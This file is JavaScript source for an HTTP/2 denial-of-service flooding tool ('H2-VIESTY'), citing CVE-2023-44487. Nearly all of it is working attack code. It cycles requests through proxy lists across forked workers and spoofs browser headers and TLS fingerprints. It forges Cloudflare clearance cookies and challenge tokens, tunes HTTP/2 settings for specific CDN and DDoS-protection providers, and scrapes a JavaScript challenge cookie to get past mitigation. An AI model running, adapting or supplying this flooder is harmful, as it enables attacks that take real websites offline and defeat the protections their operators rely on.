require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require("fs")
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const scp = require("set-cookie-parser");
const CryptoJS = require("crypto-js");
const fetch = require('node-fetch');
const util = require('util');
const dns = require('dns');
require('colors')

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }

var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[0],
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

function _log(x) {
    console.log("["+"H2-VIESTY".red.bold+"] "+x)
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
 
let currentProxy = 0;

function getProxy() {
    if(!proxies[currentProxy+1]) {
        currentProxy = 0;
    }

    currentProxy++
    return proxies[currentProxy-1]
}

 function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     let result = '';
     for (let i = 0; i < length; i++) {
         const randomIndex = Math.floor(Math.random() * characters.length);
         result += characters[randomIndex];
     }
     return result;
 }

 function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
 }

 function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstrr(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
     let result = "";
     const charactersLength = characters.length;
     for (let i = 0; i < length; i++) {
         result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     return result;
 }
 
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
 
 function ememmmmmemmeme(minLength, maxLength) {
     const characters = 'abcdefghijklmnopqrstuvwxyz';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     let result = '';
     for (let i = 0; i < length; i++) {
         const randomIndex = Math.floor(Math.random() * characters.length);
         result += characters[randomIndex];
     }
     return result;
 }

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

 const timestamp = Date.now();
 const timestampString = timestamp.toString().substring(0, 10);
 const currentDate = new Date();
 const targetDate = new Date('2025-01-01');
 
 const target = process.argv[2];
 const time = process.argv[3];
 const rate = process.argv[4];
 const threads = process.argv[5];
 const proxy = process.argv[6];
 const cookie = process.argv[7] || undefined;
 const refererIndex = process.argv.indexOf('--referers');
 const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
 const delayIndex = process.argv.indexOf('--delaytime');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const queryIndex = process.argv.indexOf('--querystring');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--botfmode');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
 
if (!target || !time || !rate || !threads || !proxy || !cookie) {
    console.clear();
    console.error(`

██╗  ██╗██████╗            ██╗ █████╗ ██╗   ██╗ █████╗ ██╗  ██╗███████╗
██║  ██║╚════██╗           ██║██╔══██╗██║   ██║██╔══██╗╚██╗██╔╝╚════██║
███████║ █████╔╝█████╗     ██║███████║██║   ██║███████║ ╚███╔╝     ██╔╝
██╔══██║██╔═══╝ ╚════╝██   ██║██╔══██║╚██╗ ██╔╝██╔══██║ ██╔██╗    ██╔╝ 
██║  ██║███████╗      ╚█████╔╝██║  ██║ ╚████╔╝ ██║  ██║██╔╝ ██╗   ██║  
╚═╝  ╚═╝╚══════╝       ╚════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝  
[+] VIESTY v2.0 Method With @JavaDDoS (CVE-2023-44487) [+]

How to use & examplec :
  node ${process.argv[1]} <target> <time> <ratelimit> <thread> <proxy> <cookie>
  node ${process.argv[1]} https://target.com/ 60 64 5 proxy.txt jawa=jawa --referers rand --delaytime 1 --querystring 1 --postdata "user=f&pass=%RAND%" --botfmode true
    
Warning : 
  Use This Method Wisely, the Author is not responsible if misused, thank you _<

Options :
  --referers https://target.com / rand - use custom referer - domains ex: fwfwwfwfw.net
  --delaytime <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
  --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
  --querystring 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
  --botfmode true/null - bot fight mode change to true if you need dont use if no need
    `);
    process.exit(1);
}

 let hcookie = '';

 if (currentDate > targetDate) {
     console.error('Error Method Has Been Outdate PM @JavaXploiter');
     process.exit(1);
 }
 
 if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
     hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;
 }

 const browserVersion = getRandomInt(120, 123);
 
 const fwfw = ['Google Chrome', 'Brave'];
 const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
 const ref = ["same-site", "same-origin", "cross-site"];
 const ref1 = ref[Math.floor(Math.random() * ref.length)];

 let brandValue;
 if (browserVersion === 120) {
     brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
 } else if (browserVersion === 121) {
     brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
 } else if (browserVersion === 122) {
     brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
 }else if (browserVersion === 123) {
     brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
 }
 
 var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
 
 const isBrave = wfwf === 'Brave';

 const acceptHeaderValue = isBrave
     ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
     : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

 const langValue = isBrave
     ? 'en-US,en;q=0.9'
     : 'en-US,en;q=0.7';

 const secGpcValue = isBrave ? "1" : undefined;

 const secChUaModel = isBrave ? '""' : undefined;
 const secChUaPlatform = isBrave ? 'Windows' : undefined;
 const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
 const secChUaMobile = isBrave ? '?0' : undefined;
 
 const secChUa = `${brandValue}`;
 
 const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

let proxies = readLines(proxy)
const parsedTarget = url.parse(target);

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
        }
        console.clear();
        console.log(`\x1b[91m██╗  ██╗██████╗ \x1b[96m           ██╗ █████╗ ██╗   ██╗ █████╗ \x1b[95m██╗  ██╗███████╗`);
        console.log(`\x1b[91m██║  ██║╚════██╗\x1b[96m           ██║██╔══██╗██║   ██║██╔══██╗\x1b[95m╚██╗██╔╝╚════██║`);
        console.log(`\x1b[91m███████║ █████╔╝\x1b[92m█████╗\x1b[96m     ██║███████║██║   ██║███████║\x1b[95m ╚███╔╝     ██╔╝`);
        console.log(`\x1b[91m██╔══██║██╔═══╝ \x1b[92m╚════╝\x1b[96m██   ██║██╔══██║╚██╗ ██╔╝██╔══██║\x1b[95m ██╔██╗    ██╔╝ `);
        console.log(`\x1b[91m██║  ██║███████╗\x1b[96m      ╚█████╔╝██║  ██║ ╚████╔╝ ██║  ██║\x1b[95m██╔╝ ██╗   ██║\x1b[97m v2  `);
        console.log(`\x1b[91m╚═╝  ╚═╝╚══════╝\x1b[96m       ╚════╝ ╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝\x1b[95m╚═╝  ╚═╝   ╚═╝  `); 
        console.log(`\x1b[97m[\x1b[96m@JavaDDoS\x1b[97m] \x1b[95m〄 \x1b[92mNew JavaX7 \x1b[96m(H2-VIESTY) \x1b[91mBest Methods\x1b[39m`);
        _log(`Target  : ${target}`)
        _log(`Proxies : ${proxies.length}`)
        _log(`Time    : ${process.argv[3]}`)
        _log(`Threads : ${threads}`);
        _log(`Rate    : ${rate}`);
        setTimeout(() => {
        }, process.argv[5] * 1000);
        for (let counter = 1; counter <= threads; counter++) {cluster.fork();}}else {setInterval(runFlooder, delay)}

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
}}

function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
        });
    return randomStringArray.join('');
}

const Socker = new NetSocket();

 const lookupPromise = util.promisify(dns.lookup);
let val;
let isp;
let pro;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('[ISP-FOUND]', url, ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);

 function runFlooder() {
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
    
 function viesty() {
     const h2_viesty = {};
     function getRandomNumber(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
   }
   maxi = getRandomNumber(2,3)
     for (let i = 1; i <=maxi ; i++) {
      
      
  
    const key = 'cf-sec-'+ generateRandomString(1,9)
  
       const value =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
  
       h2_viesty[key] = value;
     }
  
     return h2_viesty;
   }
    
    const headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": query ? handleQuery(query) : parsedTarget.path + (postdata ? `?${postdata}` : ""),
        ":scheme": parsedTarget.protocol == "https:" ? "https" : "http",
        "cache-control": "max-age=0",
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `\"Windows\"`,
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": acceptHeaderValue,
        "sec-gpc": secGpcValue,
        "sec-ch-ua-mobile": secChUaMobile,
        "sec-ch-ua-model": secChUaModel,
        "sec-ch-ua-platform": secChUaPlatform,
        "sec-ch-ua-platform-version": secChUaPlatformVersion,
        "sec-fetch-site": currentRefererValue ? ref1 : "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": langValue,
        "referer": currentRefererValue,
};

    function handleQuery(query) {
        if (query === '1') {
            return parsedTarget.path + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
        } else if (query === '2') {
            return parsedTarget.path + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
        } else if (query === '3') {
            return parsedTarget.path + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
        } else {
            return parsedTarget.path;
        }
    }

     const proxyAddr = getProxy();
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
        host: parsedProxy[0],
        port: parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15000
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);
         
         const settings = {
            headerTableSize: 65536,
            initialWindowSize: Math.random() < 0.5 ? 6291456: 1073741823,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 16384,
            enableConnectProtocol: false,
        };

         const tlsOptions = {
            port: parsedPort,
            ALPNProtocols: ["h2"],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"]
        };

         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions, () => {
         const ja3Fingerprint = generateJA3Fingerprint(tlsConn);
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60000);
         tlsConn.setMaxListeners(0);

     });

     function generateJA3Fingerprint(socket) {
         const cipherInfo = socket.getCipher();
         const supportedVersions = socket.getProtocol();

         if (!cipherInfo) {
             console.error('Cipher info is not available. TLS handshake may not have completed.');
             return null;
         }

         const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

         const md5Hash = crypto.createHash('md5');
         md5Hash.update(ja3String);

         return md5Hash.digest('hex');
     }

     tlsConn.on('connect', () => {
         const ja3Fingerprint = generateJA3Fingerprint(tlsConn);
     });
         
    function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: Math.random() < 0.5 ? 6291456: 1073741823,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 16384,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.enableConnectProtocol = false;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = 1;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            break;
    }

    return settings;
}
 
    let client;
    
    const clients = [];
    client = http2.connect(parsedTarget.href, {
        protocol: "https",
        createConnection: () => tlsConn,
        settings : getSettingsBasedOnISP(isp),
        socket: tlsConn,
    });
    clients.push(client);
    client.settings(settings);
    client.setMaxListeners(0);
    
    const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
    
    client.on('connect', () => {
    client.ping((err, duration, payload) => {
    });

    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));

});

         client.on("connect", () => {
            const IntervalAttack = (orgCookie) => {
                const _orgCookie = orgCookie || false;
                if(client.closed || client.destroyed) {
                    connection.destroy()
                    return
                }
                for (let i = 0; i < rate; i++) {
                    if(client.closed || client.destroyed) {
                        connection.destroy()
                        break
                    }
                    
                    const shuffleObject = (obj) => {
                        const keys = Object.keys(obj);
                        for (let i = keys.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [keys[i], keys[j]] = [keys[j], keys[i]];
                        }
                        const shuffledObj = {};
                        keys.forEach(key => shuffledObj[key] = obj[key]);
                        return shuffledObj;
                    };
                    
                    const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
                    let count = 0;
                    
                    const dynHeaders = shuffleObject({
                        ...headers,
                        ...(Math.random() < 0.5 ? viesty() : {}),
                    });
                    
                    const request = client.request(dynHeaders, {
                        weight: Math.random() < 0.5 ? 251 : 231,
                        depends_on: 0,
                        exclusive: Math.random() < 0.5 ? true : false,
                    })

                    .on("response", response => {
                        if(response['set-cookie']) {
                            headers["cookie"] = cookieString(scp.parse(response["set-cookie"]))
                        }

                        request.close(http2.constants.NO_ERROR);
                        request.destroy();
                    });
                    
                    request.on('end', () => {
                        count++;
                        if (count === time * rate) {
                            clearInterval(IntervalAttack);
                            client.close(http2.constants.NGHTTP2_CANCEL);
                        }
                        reject(new Error('Request timed out'));
                    });

                    request.end();
                    
                    if(i+1 >= rate) {
                        if(!client.closed && !client.destroyed) {
                            Bypass(true, _orgCookie)
                            //setTimeout(IntervalAttack, 1000)
                        } else {
                            client.destroy();
                            connection.destroy()
                        }
                    }
                }
            }

            const Bypass = (reBypass, orgCookie) => {
                try {
                    let inspectData = false;
                    
                    if(client.closed || client.destroyed) {
                        client.destroy();
                        connection.destroy();
                        return;
                    }

                    //headers[":path"] = headers[":path"].replace("%RAND%", randomIntn(10000, 100000))
                    const request = client.request(headers)

                    request.on("response", response => {
                        if(response['set-cookie']) {
                            headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))
                            orgCookie = headers['cookie']
                        }
                        //if(reBypass) {
                        //    //inspectData = true;
                        //}
                    });
                    request.on('error', error => {process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
                        client.destroy();
                        connection.destroy();
                    })

                    let data = "";
                    request.setEncoding('utf8');
                    request.on('data', (chunk) => {
                        data += chunk;
                    });

                    request.on('end', () => {
                        if(inspectData) {
                            //console.log(data)
                        }
                        let attackSended = false;

                        //balooProxy bypass stage 2 (js)
                        if(data.includes("calcSolution") && data.includes('document.cookie')) {
                            let unpackCookie = data.split(`document.cookie="`)[1].split('"')[0];
                            
                            //orgCookie = stage 1 (cookie)
                            if(orgCookie) {
                                headers['cookie'] = orgCookie + "; "+unpackCookie
                            } else {
                                headers['cookie'] = unpackCookie
                            }

                            attackSended = true;
                            IntervalAttack(orgCookie)
                        }

                        if(!attackSended) {
                            IntervalAttack()
                        }


                        data = undefined
                        request.close();
                        request.destroy();
                    });

                    request.end();
                } catch(err) {
                    //console.log(err)
                }
            }

            Bypass() 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return runFlooder();
         });
 
         client.on("error", error => {
            client.destroy();
            connection.destroy();
            return runFlooder();
         });
     });
 }

const KillScript = () => process.exit();
setTimeout(KillScript, time * 1000);
